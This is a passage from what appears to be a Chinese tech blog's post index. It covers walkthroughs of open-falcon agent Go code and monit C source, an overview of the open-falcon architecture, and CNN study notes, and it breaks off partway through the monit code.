model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t}\n\n\t\tvar resp model.AgentPluginsResponse\n        // hbs rpc接口MinePlugins，用来获取MinePlugin插件信息\n\t\terr = g.HbsClient.Call(\"Agent.MinePlugins\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"call Agent.MinePlugin fail:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tpluginDirs = resp.Plugins\n\t\ttimestamp = resp.Timestamp\n\t\t// 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"call Agent.MinePlugin:%v\\n\", resp)\n\t\t}\n\n\t\tif len(pluginDirs) == 0 {\n\t\t\tplugins.ClearAllPlugins()\n\t\t\tcontinue\n\t\t}\n\n\t\tdesiredAll := make(map[string]*plugins.Plugin)\n\t\tfilefmt_scripts := [][]string{}\n\t\tdirfmt_scripts := []string{}\n\n\t\tfor _, script_path := range pluginDirs {\n\t\t\t//script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS\n\t\t\t//比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp\n\t\t\t//1. 参数只对单个脚本文件生效，目录不支持参数\n\t\t\t//2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行\n\t\t\tvar args string = \"\"\n\n\t\t\tre := regexp.MustCompile(`(.*)\\((.*)\\)`)\n\t\t\tpath_args := re.FindAllStringSubmatch(script_path, -1)\n\t\t\tif path_args != nil {\n\t\t\t\tscript_path = path_args[0][1]\n\t\t\t\targs = path_args[0][2]\n\t\t\t}\n\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_path)\n\t\t\tif !file.IsExist(abs_path) {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif file.IsFile(abs_path) {\n\t\t\t\tfilefmt_scripts = append(filefmt_scripts, []string{script_path, args})\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tdirfmt_scripts = append(dirfmt_scripts, script_path)\n\t\t}\n\n\t\ttaken := make(map[string]struct{})\n\t\tfor _, script_file := range filefmt_scripts {\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_file[0])\n\t\t\t_, file_name := filepath.Split(abs_path)\n\t\t\tarr := strings.Split(file_name, \"_\")\n\t\t\tvar cycle int\n\t\t\tvar err error\n\t\t\tcycle, err = strconv.Atoi(arr[0])\n\t\t\tif err == nil {\n\t\t\t\tfi, _ := os.Stat(abs_path)\n\t\t\t\tplugin := &plugins.Plugin{FilePath: script_file[0], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[1]}\n\t\t\t\tdesiredAll[script_file[0]+\"(\"+script_file[1]+\")\"] = plugin\n\t\t\t}\n\t\t\t//针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件\n\t\t\ttaken[script_file[0]] = struct{}{}\n\t\t}\n\n\t\tfor _, script_path := range dirfmt_scripts {\n\t\t\tps := plugins.ListPlugins(strings.Trim(script_path, \"/\"))\n\t\t\tfor k, p := range ps {\n\t\t\t\tif _, ok := taken[k]; ok {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tdesiredAll[k] = p\n\t\t\t}\n\t\t}\n\n\t\tplugins.DelNoUsePlugins(desiredAll)\n\t\tplugins.AddNewPlugins(desiredAll)\n\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"current plugins:%v\\n\", plugins.Plugins)\n\t\t}\n\t}\n}\n```\n\n下面需要获取监控端口和路径：\n\n```go\nfunc SyncBuiltinMetrics() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo syncBuiltinMetrics()\n\t}\n}\n```\n\n```go\nfunc syncBuiltinMetrics() {\n\n\tvar timestamp int64 = -1\n\tvar checksum string = \"nil\"\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ports = []int64{}\n\t\tvar paths = []string{}\n\t\tvar procs = make(map[string]map[int]string)\n\t\tvar urls = make(map[string]string)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\treq := model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t\tChecksum: checksum,\n\t\t}\n\n\t\tvar resp model.BuiltinMetricResponse\n        // 调用rpc接口获取监控端口和路径\n\t\terr = g.HbsClient.Call(\"Agent.BuiltinMetrics\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Checksum == checksum {\n\t\t\tcontinue\n\t\t}\n\n\t\ttimestamp = resp.Timestamp\n\t\tchecksum = resp.Checksum\n\n\t\tfor _, metric := range resp.Metrics {\n\n\t\t\tif metric.Metric == g.URL_CHECK_HEALTH {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\turl := strings.Split(arr[0], \"=\")\n\t\t\t\tif len(url) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tstime := strings.Split(arr[1], \"=\")\n\t\t\t\tif len(stime) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tif _, err := strconv.ParseInt(stime[1], 10, 64); err == nil {\n\t\t\t\t\turls[url[1]] = stime[1]\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metric ParseInt timeout failed:\", err)\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif metric.Metric == g.NET_PORT_LISTEN {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tif port, err := strconv.ParseInt(arr[1], 10, 64); err == nil {\n\t\t\t\t\tports = append(ports, port)\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metrics ParseInt failed:\", err)\n\t\t\t\t}\n\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.DU_BS {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tpaths = append(paths, strings.TrimSpace(arr[1]))\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.PROC_NUM {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\n\t\t\t\ttmpMap := make(map[int]string)\n\n\t\t\t\tfor i := 0; i < len(arr); i++ {\n\t\t\t\t\tif strings.HasPrefix(arr[i], \"name=\") {\n\t\t\t\t\t\ttmpMap[1] = strings.TrimSpace(arr[i][5:])\n\t\t\t\t\t} else if strings.HasPrefix(arr[i], \"cmdline=\") {\n\t\t\t\t\t\ttmpMap[2] = strings.TrimSpace(arr[i][8:])\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tprocs[metric.Tags] = tmpMap\n\t\t\t}\n\t\t}\n\n\t\tg.SetReportUrls(urls)\n\t\tg.SetReportPorts(ports)\n\t\tg.SetReportProcs(procs)\n\t\tg.SetDuPaths(paths)\n\n\t}\n}\n```\n\n获取信任IP列表：\n\n```go\nfunc syncTrustableIps() {\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ips string\n        // 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/\n\t\terr := g.HbsClient.Call(\"Agent.TrustableIps\", model.NullRpcRequest{}, &ips)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR: call Agent.TrustableIps fail\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tg.SetTrustableIps(ips)\n\t}\n}\n```\n\n收集指标数据collector\n\n```go\nfunc Collect() {\n\n\tif !g.Config().Transfer.Enabled {\n\t\treturn\n\t}\n\n\tif len(g.Config().Transfer.Addrs) == 0 {\n\t\treturn\n\t}\n\n\tfor _, v := range funcs.Mappers {\n\t\tgo collect(int64(v.Interval), v.Fs)\n\t}\n}\n```\n\n函数collect\n\n```go\nfunc collect(sec int64, fns []func() []*model.MetricValue) {\n\tt := time.NewTicker(time.Second * time.Duration(sec))\n\tdefer t.Stop()\n    // 根据获取到的map的指标的数组，去抓取数据\n\tfor {\n\t\t<-t.C\n\t\t// hostname\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tmvs := []*model.MetricValue{}\n         // 获取忽略指标\n\t\tignoreMetrics := g.Config().IgnoreMetrics\n\n\t\tfor _, fn := range fns {\n\t\t\titems := fn()\n\t\t\tif items == nil {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif len(items) == 0 {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t\n\t\t\tfor _, mv := range items {\n\t\t\t\tif b, ok := ignoreMetrics[mv.Metric]; ok && b {\n\t\t\t\t\tcontinue\n\t\t\t\t} else {\n\t\t\t\t\tmvs = append(mvs, mv)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tnow := time.Now().Unix()\n\t\tfor j := 0; j < len(mvs); j++ {\n\t\t\tmvs[j].Step = sec\n\t\t\tmvs[j].Endpoint = hostname\n\t\t\tmvs[j].Timestamp = now\n\t\t}\n\t\t// 发送数据到transfer\n\t\tg.SendToTransfer(mvs)\n\n\t}\n}\n```\n\n数据发送函数SendToTransfer：\n\n```go\nfunc SendToTransfer(metrics []*model.MetricValue) {\n\tif len(metrics) == 0 {\n\t\treturn\n\t}\n\n\tdt := Config().DefaultTags\n\tif len(dt) > 0 {\n\t\tvar buf bytes.Buffer\n\t\tdefault_tags_list := []string{}\n\t\tfor k, v := range dt {\n\t\t\tbuf.Reset()\n\t\t\tbuf.WriteString(k)\n\t\t\tbuf.WriteString(\"=\")\n\t\t\tbuf.WriteString(v)\n\t\t\tdefault_tags_list = append(default_tags_list, buf.String())\n\t\t}\n\t\tdefault_tags := strings.Join(default_tags_list, \",\")\n\n\t\tfor i, x := range metrics {\n\t\t\tbuf.Reset()\n\t\t\tif x.Tags == \"\" {\n\t\t\t\tmetrics[i].Tags = default_tags\n\t\t\t} else {\n\t\t\t\tbuf.WriteString(metrics[i].Tags)\n\t\t\t\tbuf.WriteString(\",\")\n\t\t\t\tbuf.WriteString(default_tags)\n\t\t\t\tmetrics[i].Tags = buf.String()\n\t\t\t}\n\t\t}\n\t}\n\n\tdebug := Config().Debug\n\n\tif debug {\n\t\tlog.Printf(\"=> <Total=%d> %v\\n\", len(metrics), metrics[0])\n\t}\n\n\tvar resp model.TransferResponse\n    // 最重要的地方，发送数据\n\tSendMetrics(metrics, &resp)\n\n\tif debug {\n\t\tlog.Println(\"<=\", &resp)\n\t}\n}\n```\n\n```go\nfunc SendMetrics(metrics []*model.MetricValue, resp *model.TransferResponse) {\n\trand.Seed(time.Now().UnixNano())\n\tfor _, i := range rand.Perm(len(Config().Transfer.Addrs)) {\n\t\taddr := Config().Transfer.Addrs[i]\n\t\t// 获取transfer的客户端\n\t\tc := getTransferClient(addr)\n\t\tif c == nil {\n            //没有就初始化一个\n\t\t\tc = initTransferClient(addr)\n\t\t}\n\t\t//抓取数据\n\t\tif updateMetrics(c, metrics, resp) {\n\t\t\tbreak\n\t\t}\n\t}\n}\n```\n\n调用transfer模块的rpc接口update来更新数据：\n\n```go\n\nfunc updateMetrics(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse) bool {\n\terr := c.Call(\"Transfer.Update\", metrics, resp)\n\tif err != nil {\n\t\tlog.Println(\"call Transfer.Update fail:\", c, err)\n\t\treturn false\n\t}\n\treturn true\n}\n```\n\n最后启动http服务，启动服务之前需要初始化init函数:\n\n```go\nfunc init() {\n\tconfigAdminRoutes()  // 初始化admin接口路由\n\tconfigCpuRoutes()    // 初始化cpu接口路由\n\tconfigDfRoutes()     // 初始化磁盘接口路由\n\tconfigHealthRoutes()   // 初始化健康度路由\n\tconfigIoStatRoutes()   //初始化io\n\tconfigKernelRoutes()   //初始化内核\n\tconfigMemoryRoutes()   //初始化memory\n\tconfigPageRoutes()    //初始化page\n\tconfigPluginRoutes()   //初始化插件\n\tconfigPushRoutes()     //初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer\n\tconfigRunRoutes()      //初始化Run\n\tconfigSystemRoutes()    //初始化系统\n}\n```\n\n启动http服务Start函数：\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\treturn\n\t}\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\n\ts := &http.Server{\n\t\tAddr:           addr,\n\t\tMaxHeaderBytes: 1 << 30,\n\t}\n\n\tlog.Println(\"listening\", addr)\n\tlog.Fatalln(s.ListenAndServe())\n}\n```\n\n补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"redis 源码思维导图","url":"/2020/01/20/redis源码分析思维导图/","content":"\n## redis 源码思维导图\n\n本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..\n\n![redis-server](/images/redis-server.png)","tags":["redis"],"categories":["redis"]},{"title":"open-falcon 架构","url":"/2020/01/20/open-falcon框架学习/","content":"\n## open-falcon 架构\n\nopen-falcon 主要架构图：\n\n![open-falcon architecture](/images/func_intro_1.png)\n\n各个模块说明：\n\nagent 组件：\n\n目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。\n\n数据上报支持三种方式: \n\n1. agent 自采集基础监控上报；\n\n2. 用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)；\n\n3. 插件采集上报。\n\nhbs 组件：\n\n心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。\n\ntransfer 组件：\n\n启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。\n\ngraph 组件：\n\n接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。\n\njudge 组件：\n\n定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。\n\nalarm 组件：\n\n不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。\n\naggregator 组件：\n\n集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。\n\nnodata 组件：\n\nnodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。\n","tags":["monitor"],"categories":["monitor"]},{"title":"CNN学习笔记","url":"/2020/01/19/CNN学习/","content":"\n## CNN学习笔记\n\n**从神经网络到卷积神经网络（CNN）**\n\n![img](/images/1093303-20170430194200912-687300437.jpg)\n\n**卷积神经网络的层级结构**\n   • 数据输入层/ Input layer\n　• 卷积计算层/ CONV layer\n　• ReLU激励层 / ReLU layer\n　• 池化层 / Pooling layer\n　• 全连接层 / FC layer\n\n### **数据输入层**\n\n该层要做的处理主要是对原始图像数据进行预处理，其中包括：\n\n去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。\n\n 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。\n\nPCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化\n\n去均值与归一化效果图：\n\n![img](/images/1093303-20170430194338194-1949897491.jpg)\n\n去相关与白化效果图：\n\n![img](/images/1093303-20170430194357553-1200745791.jpg)\n\n### **卷积计算层**\n\n局部关联。每个神经元看做一个滤波器(filter)\n\n窗口(receptive field)滑动， filter对局部数据计算\n\n深度/depth\n\n步长/stride （窗口一次滑动的长度）\n\n填充值/zero-padding\n\n![img](/images/1093303-20170430194425147-845167791.png)\n\n![img](/images/1093303-20190120113539659-455066516.gif)\n\n**参数共享机制**\n\n在卷积层中每个神经元连接数据窗的权重是固定的，每个神经元只关注一个特性。神经元就是图像处理中的滤波器，比如边缘检测专用的Sobel滤波器，即卷积层的每个滤波器都会有自己所关注一个图像特征，比如垂直边缘，水平边缘，颜色，纹理等等，这些所有神经元加起来就好比就是整张图像的特征提取器集合。\n\n一组固定的权重和不同窗口内数据做内积: 卷积\n\n### **激励层**\n\n把卷积层输出结果做非线性映射。\n\n![img](/images/1093303-20170430194934006-705271151.jpg)\n\nCNN采用的激励函数一般为ReLU(The Rectified Linear Unit/修正线性单元)                 \n\n激励层的实践经验：\n不要用sigmoid！不要用sigmoid！不要用sigmoid！\n首先试RELU，因为快，但要小心点\n如果2失效，请用Leaky ReLU或者Maxout\n某些情况下tanh倒是有不错的结果，但是很少\n\n### **池化层**\n\n池化层夹在连续的卷积层中间， 用于压缩数据和参数的量，减小过拟合。\n简而言之，如果输入是图像的话，那么池化层的最主要作用就是压缩图像。\n\n1. 特征不变性，也就是我们在图像处理中经常提到的特征的尺度不变性，池化操作就是图像的resize，平时一张狗的图像被缩小了一倍我们还能认出这是一张狗的照片，这说明这张图像中仍保留着狗最重要的特征，我们一看就能判断图像中画的是一只狗，图像压缩时去掉的信息只是一些无关紧要的信息，而留下的信息则是具有尺度不变性的特征，是最能表达图像的特征。\n2. 特征降维，我们知道一幅图像含有的信息是很大的，特征也很多，但是有些信息对于我们做图像任务时没有太多用途或者有重复，我们可以把这类冗余信息去除，把最重要的特征抽取出来，这也是池化操作的一大作用。\n3. 在一定程度上防止过拟合，更方便优化。\n\n![img](/images/1093303-20170430195028600-318072954.jpg)\n\n\n\n池化层用的方法有Max pooling 和 average pooling，而实际用的较多的是Max pooling。\n\nMax pooling：\n\n对于每个2*2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2*2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。\n\n### **全连接层**\n\n![img](/images/1093303-20170430195130772-454262568.jpg)\n\n**一般CNN结构依次为**\n　　1. INPUT\n　　2. [[CONV -> RELU]*N -> POOL?]*M \n　　3. [FC -> RELU]*K\n　　4. FC\n\n**卷积神经网络之优缺点**：\n\n优点：\n共享卷积核，对高维数据处理无压力\n无需手动选取特征，训练好权重，即得特征分类效果好\n缺点：\n需要调参，需要大样本量，训练最好要GPU\n物理含义不明确\n\n**总结**\n卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["深度学习"],"categories":["深度学习"]},{"title":"monit代码分析","url":"/2020/01/17/monit学习/","content":"\n## monit代码分析\n\n主要流程main函数:\n\n```c\n/**\n * The Prime mover\n */\nint main(int argc, char **argv) {\n        Bootstrap(); // Bootstrap libmonit  //初始化代码\n        Bootstrap_setAbortHandler(vLogAbortHandler);  // Abort Monit on exceptions thrown by libmonit\n        Bootstrap_setErrorHandler(vLogError);\n        setlocale(LC_ALL, \"C\");\n        prog = File_basename(argv[0]);\n#ifdef HAVE_OPENSSL\n        Ssl_start();\n#endif\n        init_env();\n        handle_options(argc, argv);\n        do_init();\n        do_action(argc, argv);\n        do_exit(false);\n        return 0;\n}\n```\n\nBootstrap函数：\n\n ```c\nBootstrap:\nvoid Bootstrap(void) {\n        Exception_init();\n        Thread_init();\n}\n\n ```\n\nSsl_start函数，加载ssl协议\n\n```c\nvoid Ssl_start() {\n#if (OPENSSL_VERSION_NUMBER < 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER)\n        SSL_library_init();\n        SSL_load_error_strings();\n        int locks = CRYPTO_num_locks();\n        instanceMutexTable = CALLOC(locks, sizeof(Mutex_T));\n        for (int i = 0; i < locks; i++)\n                Mutex_init(instanceMutexTable[i]);\n        CRYPTO_THREADID_set_callback(_threadID);\n        CRYPTO_set_locking_callback(_mutexLock);\n#endif\n        if (File_exist(URANDOM_DEVICE))\n                RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES);\n        else if (File_exist(RANDOM_DEVICE))\n                RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES);\n        else\n                THROW(AssertException, \"SSL: cannot find %s nor %s on the system\", URANDOM_DEVICE, RANDOM_DEVICE);\n}\n```\n\n初始化环境：\n\n```c\n/**\n * Initialize the program environment\n *\n * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11\n */\nvoid init_env() {\n        Util_closeFds();\n        // Ensure that std descriptors (0, 1 and 2) are open\n        int devnull = open(\"/dev/null\", O_RDWR);\n        if (devnull == -1) {\n                THROW(AssertException, \"Cannot open /dev/null -- %s\", STRERROR);\n        }\n        for (int i = 0; i < 3; i++) {\n                struct stat st;\n                if (fstat(i, &st) == -1) {\n                        if (dup2(devnull, i) < 0) {\n                                close(devnull);\n                                THROW(AssertException, \"dup2 failed -- %s\", STRERROR);\n                        }\n                }\n        }\n        close(devnull);\n        // Get password struct with user info\n        char buf[4096];\n        struct passwd pw, *result = NULL;\n        if (getpwuid_r(geteuid(), &pw, buf, sizeof(buf), &result) != 0 || ! result)\n                THROW(AssertException, \"getpwuid_r failed -- %s\", STRERROR);\n        Run.Env.home = Str_dup(pw.pw_dir);\n        Run.Env.user = Str_dup(pw.pw_name);\n        // Get CWD\n        char t[PATH_MAX];\n        if (! Dir_cwd(t, PATH_MAX))\n                THROW(AssertException, \"Monit: Cannot read current directory -- %s\", STRERROR);\n        Run.Env.cwd = Str_dup(t);\n}\n\n```\n\nhandle_options函数处理传参情况：\n\ndo_init函数初始化文件和服务\n\n```c\n/**\n * Initialize this application - Register signal handlers,\n * Parse the control file and initialize the program's\n * datastructures and the log system.\n */\nstatic void do_init() {\n        /*\n         * Register interest for the SIGTERM signal,\n         * in case we run in daemon mode this signal\n         * will terminate a running daemon.\n         */\n        signal(SIGTERM, do_destroy);\n\n        /*\n         * Register interest for the SIGUSER1 signal,\n         * in case we run in daemon mode this signal\n         * will wakeup a sleeping daemon.\n         */\n        signal(SIGUSR1, do_wakeup);\n\n        /*\n         * Register interest for the SIGINT signal,\n         * in case we run as a server but not as a daemon\n         * we need to catch this signal if the user pressed\n         * CTRL^C in the terminal\n         */\n        signal(SIGINT, do_destroy);\n\n        /*\n         * Register interest for the SIGHUP signal,\n         * in case we run in daemon mode this signal\n         * will reload the configuration.\n         */\n        signal(SIGHUP, do_reload);\n\n        /*\n         * Register no interest for the SIGPIPE signal,\n         */\n        signal(SIGPIPE, SIG_IGN);\n\n        /*\n         * Initialize the random number generator\n         */\n        srandom((unsigned)(Time_now() + getpid()));\n\n        /*\n         * Initialize the Runtime mutex. This mutex\n         * is used to synchronize handling of global\n         * service data\n         */\n        Mutex_init(Run.mutex);\n\n        /*\n         * Initialize heartbeat mutex and condition\n         */\n        Mutex_init(heartbeatMutex);\n        Sem_init(heartbeatCond);\n\n        /*\n         * Get the position of the control file\n         */\n        if (! Run.files.control)\n                Run.files.control = file_findControlFile();\n\n        /*\n         * Initialize the system information data collecting interface\n         */\n        if (init_system_info())\n                Run.flags |= Run_ProcessEngineEnabled;\n\n        /*\n         * Start the Parser and create the service list. This will also set\n         * any Runtime constants defined in the controlfile.\n         */\n        if (! parse(Run.files.control))\n                exit(1);\n\n        /*\n         * Initialize the log system\n         */\n        if (! log_init())\n                exit(1);\n\n        /*\n         * Did we find any service ?\n         */\n        if (! servicelist) {\n                LogError(\"No service has been specified\\n\");\n                exit(0);\n        }\n\n        /*\n         * Initialize Runtime file variables\n         */\n        file_init();\n\n        /*\n         * Should we print debug information ?\n         */\n        if (Run.debug) {\n                Util_printRunList();\n                Util_printServiceList();\n        }\n\n        /*\n         * Reap any stray child processes we may have created\n         */\n        atexit(waitforchildren);\n}\n```\n\nfile_findControlFile()函数，读取配置文件，corefoundation\n\n```c\nchar *file_findControlFile() {\n        char *rcfile = CALLOC(sizeof(char), STRLEN + 1);\n        snprintf(rcfile, STRLEN, \"%s/.%s\", Run.Env.home, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"%s/%s\", SYSCONFDIR, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/usr/local/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        if (File_exist(MONITRC)) {\n                snprintf(rcfile, STRLEN, \"%s/%s\", Run.Env.cwd, MONITRC);\n                return rcfile;\n        }\n        LogError(\"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \\n\", MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC);\n        exit(1);\n}\n```\n\ndo_action主流程:\n\n```c\n/**\n * Dispatch to the submitted action - actions are program arguments\n */\nstatic void do_action(int argc, char **args) {\n        char *action = args[optind];\n\n        Run.flags |= Run_Once;\n\n        if (! action) {\n                do_default();\n        } else if (IS(action, \"start\")     ||\n                   IS(action, \"stop\")      ||\n                   IS(action, \"monitor\")   ||\n                   IS(action, \"unmonitor\") ||\n                   IS(action, \"restart\")) {\n                char *service = args[++optind];\n                if (Run.mygroup || service) {\n                        int errors = 0;\n                        List_T services = List_new();\n                        if (Run.mygroup) {\n                                for (ServiceGroup_T sg = servicegrouplist; sg; sg = sg->next) {\n                                        if (IS(Run.mygroup, sg->name)) {\n                                                for (list_t m = sg->members->head; m; m = m->next) {\n                                                        Service_T s = m->e;\n                                                        List_append(services, s->name);\n                                                }\n                                                break;\n                                        }\n                                }\n                                if (List_length(services) == 0) {\n                                        List_free(&services);\n                                        LogError(\"Group '%s' not found\\n\", Run.mygroup);\n                                        exit(1);\n                                }\n                        } else if (IS(service, \"all\")) {\n                                for (Service_T s = servicelist; s; s = s->next)\n                                        List_append(services, s->name);\n                        } else {\n                                List_append(services, service);\n                        }\n                        errors = exist_daemon() ? (HttpClient_action(action, services) ? 0 : 1) : control_service_string(services, action);\n                        List_free(&services);\n                        if (errors)\n                                exit(1);\n                } else {\n                        LogError(\"Please specify a service name or 'all' after %s\\n\", action);\n                        exit(1);\n                }\n        } else if (IS(action, \"reload\")) {\n                LogInfo(\"Reinitializing %s daemon\\n\", prog);\n                kill_daemon(SIGHUP);\n        } else if (IS(action, \"status\")) {\n                char *service = args[++optind];\n                if (! HttpClient_status(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"summary\")) {\n                char *service = args[++optind];\n                if (! HttpClient_summary(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"report\")) {\n                char *type = args[++optind];\n                if (! HttpClient_report(type))\n                        exit(1);\n        } else if (IS(action, \"procmatch\")) {\n        